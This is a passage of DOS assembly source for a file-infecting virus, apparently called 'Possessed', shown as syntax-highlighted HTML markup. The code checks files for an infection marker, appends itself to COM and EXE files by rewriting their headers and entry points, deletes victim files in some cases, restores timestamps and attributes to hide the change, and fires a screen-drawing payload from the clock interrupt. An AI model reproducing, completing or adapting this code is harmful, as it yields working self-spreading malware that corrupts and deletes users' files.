       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">NotInfected</span><span class="sc0">
 </span><span class="sc5">ComInfectCheck</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PossessedEntry</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">cld</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">isDos</span><span class="sc4">-</span><span class="sc5">PossessedId</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc6">repe</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">VerifyInfection</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">NotInfected</span><span class="sc0">
 </span><span class="sc5">VerifyInfection</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EncryptedAuthor</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">25h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Scrambler</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Author</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Compare</span><span class="sc0">
       </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">HideText</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FuckOff</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2bh</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Scrambler</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0d5h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Scrambler</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">DeleteFile</span><span class="sc0">
 </span><span class="sc5">HideText</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Scrambler</span><span class="sc0">
 
 </span><span class="sc5">DoneWithFile</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc5">AllocatedMemory</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">49h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">Handle</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">FileDate</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">FileTime</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3eh</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc5">VictimAsciizSegment</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">VictimAsciizOffset</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">Attribute</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">RestoreRegisters</span><span class="sc0">
 
 </span><span class="sc5">NotInfected</span><span class="sc4">:</span><span class="sc0">  
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc5">VictimAsciizSegment</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">VictimAsciizOffset</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc12">'A'</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">DosVersion</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
       </span><span class="sc6">jnb</span><span class="sc0">     </span><span class="sc5">NewDosVersion</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EncryptedCommandCom</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">11</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">17h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Scrambler</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NameOfVictim</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Compare</span><span class="sc0">
       </span><span class="sc6">pushf</span><span class="sc0">
       </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Scrambler</span><span class="sc0">
       </span><span class="sc6">popf</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">NewDosVersion</span><span class="sc0">
 </span><span class="sc5">Relay5</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">DoneWithFile</span><span class="sc0">
 </span><span class="sc5">NewDosVersion</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">36h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
       </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
       </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">EnoughDiskSpace</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2300</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">DeleteFile</span><span class="sc0">
 </span><span class="sc5">EnoughDiskSpace</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">Handle</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MovePointerBegin</span><span class="sc0">
 </span><span class="sc5">Relay6</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">Relay5</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc5">AllocatedMemory</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">isComFile</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">isExeFile</span><span class="sc0">
 
 </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">Possessed</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">Possessed</span><span class="sc0">
 
 </span><span class="sc5">isComFile</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VictimCode</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PossessedEntry</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">Relay6</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">ComLength</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc5">AllocatedMemory</span><span class="sc0">
 
 </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">Possessed</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">nothing</span><span class="sc0">
 
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">Relay7</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MoveVirusCode</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ExecuteVictimCom</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">DeleteFile</span><span class="sc0">
 </span><span class="sc5">Relay7</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">VerifyInfection</span><span class="sc0">
 
 </span><span class="sc5">DeleteFile</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc5">VictimAsciizSegment</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">VictimAsciizOffset</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">DoneWithFile</span><span class="sc0">
 
 </span><span class="sc5">PixelRow</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">Environment</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
 </span><span class="sc5">PixelColumn</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">Psp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">
 
 </span><span class="sc5">isClock</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pushf</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc5">Timer</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">NotYetTime</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc5">Hour</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ShowTime</span><span class="sc0">
 </span><span class="sc5">NotYetTime</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">popf</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ClockInterrupt</span><span class="sc0">
 
 </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">Possessed</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">Possessed</span><span class="sc0">
 
 </span><span class="sc5">ShowTime</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">popf</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
 </span><span class="sc5">LoadFaceData</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">FaceData</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">PixelRow</span><span class="sc4">,</span><span class="sc2">200</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">PixelColumn</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ShowPayload</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">PixelRow</span><span class="sc4">,</span><span class="sc2">201</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">PixelColumn</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ShowPayload</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">PixelRow</span><span class="sc4">,</span><span class="sc2">189</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">PixelColumn</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ShowPayload</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">PixelRow</span><span class="sc4">,</span><span class="sc2">201</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">PixelColumn</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ShowPayload</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">PixelRow</span><span class="sc4">,</span><span class="sc2">189</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">PixelColumn</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ShowPayload</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">LoadFaceData</span><span class="sc0">
 </span><span class="sc5">ShowPayload</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
 </span><span class="sc5">EraseFace</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
 </span><span class="sc5">GetNextCoordinate</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">EndFaceData</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">PixelRow</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">PixelColumn</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0ch</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">GetNextCoordinate</span><span class="sc0">
 </span><span class="sc5">EndFaceData</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">EraseFace</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
 
 </span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">Possessed</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc10">nothing</span><span class="sc0">
 
 </span><span class="sc5">isExeFile</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isCxSum</span><span class="sc4">,</span><span class="sc2">1970h</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">ExeNotInfected</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">VerifyInfection</span><span class="sc0">
 </span><span class="sc5">ExeNotInfected</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isCxSum</span><span class="sc4">,</span><span class="sc2">1970h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isSs</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ExeSs</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isSp</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ExeSp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isIp</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ExeIp</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isCs</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ExeCs</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isBlocks</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isMod</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">PageAligned</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc5">PageAligned</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">
       </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.isMod</span><span class="sc0">
       </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">15</span><span class="sc0">
       </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0fff0h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ExeLengthLo</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">ExeLengthHi</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VictimCode</span><span class="sc0">
       </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">Relay8</span><span class="sc0">
       </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">AlignedToPage</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
